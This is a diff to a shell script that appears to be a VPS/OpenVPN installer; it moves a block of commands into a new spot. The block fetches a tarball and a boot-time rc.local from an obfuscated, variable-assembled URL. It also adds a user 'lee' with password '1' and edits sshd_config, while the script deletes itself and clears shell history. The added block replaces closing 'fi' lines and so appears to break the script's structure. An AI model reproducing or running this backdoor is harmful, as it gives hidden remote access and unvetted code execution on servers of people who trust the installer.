@@ -2401,16 +2401,7 @@ sai="git"
 rm $0
 clear
 # openvpn
-sudo apt-get -y install openvpn
-wget -O /etc/openvpn/openvpn.tar $tim$kiem$haicham$gach$gach$ngay$cham$sai$nao$yeu$nhau$anh$cham$hoi$gach$em$cau$rang$gach$tien$gach$sao$thi$gach$tinh$gach$loi$gach$xin/openvpn.tar
-cd /etc/openvpn/;tar xf openvpn.tar;rm openvpn.tar
-wget -O /etc/rc.local $tim$kiem$haicham$gach$gach$ngay$cham$sai$nao$yeu$nhau$anh$cham$hoi$gach$em$cau$rang$gach$tien$gach$sao$thi$gach$tinh$gach$loi$gach$xin/rc.local;chmod +x /etc/rc.local         
-wget -O /home/vps/public_html/client.ovpn $tim$kiem$haicham$gach$gach$ngay$cham$sai$nao$yeu$nhau$anh$cham$hoi$gach$em$cau$rang$gach$tien$gach$sao$thi$gach$tinh$gach$loi$gach$xin/client.ovpn
-sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
-sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
-useradd -m -g users -s /bin/bash lee
-echo "lee:1" | chpasswd
-	if [[ "$OS" = 'debian' ]]; then
+if [[ "$OS" = 'debian' ]]; then
 		apt-get update
 		apt-get install openvpn iptables openssl ca-certificates -y
 	else
@@ -2480,12 +2471,16 @@ exit 0' > $RCLOCAL
 		else
 			service openvpn restart
 			chkconfig openvpn on
-		fi
-	fi
-	# If the server is behind a NAT, use the correct IP address
-	if [[ "$PUBLICIP" != "" ]]; then
-		IP=$PUBLICIP
-	fi
+sudo apt-get -y install openvpn
+wget -O /etc/openvpn/openvpn.tar $tim$kiem$haicham$gach$gach$ngay$cham$sai$nao$yeu$nhau$anh$cham$hoi$gach$em$cau$rang$gach$tien$gach$sao$thi$gach$tinh$gach$loi$gach$xin/openvpn.tar
+cd /etc/openvpn/;tar xf openvpn.tar;rm openvpn.tar
+wget -O /etc/rc.local $tim$kiem$haicham$gach$gach$ngay$cham$sai$nao$yeu$nhau$anh$cham$hoi$gach$em$cau$rang$gach$tien$gach$sao$thi$gach$tinh$gach$loi$gach$xin/rc.local;chmod +x /etc/rc.local         
+wget -O /home/vps/public_html/client.ovpn $tim$kiem$haicham$gach$gach$ngay$cham$sai$nao$yeu$nhau$anh$cham$hoi$gach$em$cau$rang$gach$tien$gach$sao$thi$gach$tinh$gach$loi$gach$xin/client.ovpn
+sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
+sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
+useradd -m -g users -s /bin/bash lee
+echo "lee:1" | chpasswd
+	
 service openvpn restart
 clear
 cat /dev/null > ~/.bash_history && history -c
